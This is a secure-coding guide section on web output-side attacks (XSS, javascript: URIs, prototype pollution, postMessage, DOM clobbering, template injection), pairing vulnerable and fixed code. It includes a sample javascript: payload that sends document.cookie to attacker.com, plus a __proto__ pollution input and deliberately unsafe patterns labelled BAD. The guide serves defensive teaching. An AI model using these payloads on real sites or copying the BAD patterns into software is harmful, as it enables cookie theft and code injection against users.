# XSS, Injection & DOM Attacks

86% of AI-generated code fails XSS prevention tests (OX Security / CSA, 2025). Veracode found AI-generated code is 2.74× more likely to contain XSS than human-written code. This is distinct from SQL injection (covered in `data-access.md`) — this section covers output-side injection into HTML, URLs, and the DOM.

## Reflected & Stored XSS

The most common AI pattern: rendering user-controlled content directly into HTML without sanitization.

```tsx
// BAD: renders raw user-supplied HTML — executes scripts
<div dangerouslySetInnerHTML={{ __html: post.body }} />

// BAD: same issue with innerHTML directly
document.getElementById('content').innerHTML = apiResponse.content;

// GOOD: sanitize before rendering
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(post.body, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li', 'br'],
  ALLOWED_ATTR: ['href', 'target', 'rel'],
  FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed'],
});
<div dangerouslySetInnerHTML={{ __html: clean }} />
```

React's JSX escapes strings by default — `{userContent}` is safe. The vulnerability only appears with `dangerouslySetInnerHTML`, `innerHTML`, `document.write`, or `eval()`.

## `javascript:` URI Injection

```tsx
// BAD: executes JavaScript when clicked
<a href={user.website}>Visit profile</a>
// If user.website = "javascript:fetch('https://attacker.com?c='+document.cookie)"

// GOOD: validate href is http/https before rendering
const isSafeUrl = (url: string) => /^https?:\/\//i.test(url);
{isSafeUrl(user.website) && <a href={user.website} rel="noopener noreferrer">Visit profile</a>}
```

This affects any place user-supplied strings are used as `href`, `src`, or `action` attributes.

## Content Security Policy (CSP)

CSP is a browser enforcement layer that limits where scripts can load from. Even if an XSS payload gets through, a strict CSP prevents it from executing or exfiltrating data.

```javascript
// next.config.js — strict CSP
const ContentSecurityPolicy = `
  default-src 'self';
  script-src 'self' 'nonce-${nonce}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  font-src 'self';
  connect-src 'self' https://api.yourapp.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
`.replace(/\n/g, ' ');
```

`'unsafe-inline'` on `script-src` defeats most of the protection. Use nonces or hashes for inline scripts rather than `'unsafe-inline'`.

## postMessage Origin Bypass

`window.addEventListener('message', handler)` is a common pattern for cross-frame communication. Without validating `event.origin`, any page can send messages to your frame.

```typescript
// BAD: accepts messages from any origin
window.addEventListener('message', (event) => {
  if (event.data.type === 'setToken') {
    localStorage.setItem('token', event.data.token);
  }
});

// GOOD: validate origin before trusting message
const ALLOWED_ORIGINS = ['https://yourapp.com', 'https://app.yourapp.com'];
window.addEventListener('message', (event) => {
  if (!ALLOWED_ORIGINS.includes(event.origin)) return;
  // now handle the message
});
```

## Prototype Pollution

User-controlled JSON merged into objects can inject `__proto__` or `constructor.prototype`, poisoning all objects in the Node.js runtime. This is especially dangerous in the context of AI-generated code that uses lodash `merge`, `Object.assign`, or custom recursive merge functions with untrusted input.

```javascript
// DANGEROUS: deep merge of user-controlled object
const config = _.merge({}, defaultConfig, req.body);
// If req.body = { "__proto__": { "admin": true } }
// then ({}).admin === true — ALL objects now have admin: true

// SAFE options:
// 1. Validate with Zod before merging — Zod strips unknown keys
const validated = ConfigSchema.parse(req.body);
const config = { ...defaultConfig, ...validated };

// 2. Use JSON.parse(JSON.stringify(obj)) to strip prototype properties
const sanitized = JSON.parse(JSON.stringify(req.body));

// 3. Use Object.create(null) for plain data containers
const safe = Object.assign(Object.create(null), req.body);
```

## Subresource Integrity (SRI) for CDN Scripts

If your app loads JavaScript from a CDN without an `integrity` attribute, a CDN compromise can silently update your script to exfiltrate user data.

```html
<!-- BAD: no integrity check — CDN can serve malicious code -->
<script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>

<!-- GOOD: hash-locked to a specific version -->
<script
  src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"
></script>
```

Generate SRI hashes: `curl -s <url> | openssl dgst -sha384 -binary | openssl base64 -A`

In Next.js, prefer installing packages locally rather than loading from CDN — SRI is harder to maintain and CDN loading adds third-party dependencies to your supply chain.

## DOM Clobbering

Named HTML elements override global JavaScript variables — an attacker who can inject `<img name="config" id="baseUrl">` into your page overwrites `window.config` and `window.baseUrl`. This is typically relevant when user-supplied HTML is sanitized but the sanitizer allows `name`/`id` attributes on non-form elements.

Configure DOMPurify to strip dangerous attributes:

```javascript
DOMPurify.sanitize(html, {
  FORBID_ATTR: ['id', 'name'], // or allowlist only what you need
});
```

## Template Injection (Server-Side)

AI-generated apps using Handlebars, EJS, Nunjucks, or similar templating engines sometimes pass user input directly into templates:

```javascript
// BAD: renders user-controlled template string — RCE with Handlebars
const template = Handlebars.compile(req.body.template);
const output = template({ user: currentUser });

// BAD: EJS template injection
const html = ejs.render(req.body.content, data);

// GOOD: pass user input as data to a fixed template, never as the template itself
const html = ejs.render(FIXED_TEMPLATE, { userContent: escape(req.body.content) });
```

Template injection that reaches `eval()` or Node.js's `child_process` is Remote Code Execution.
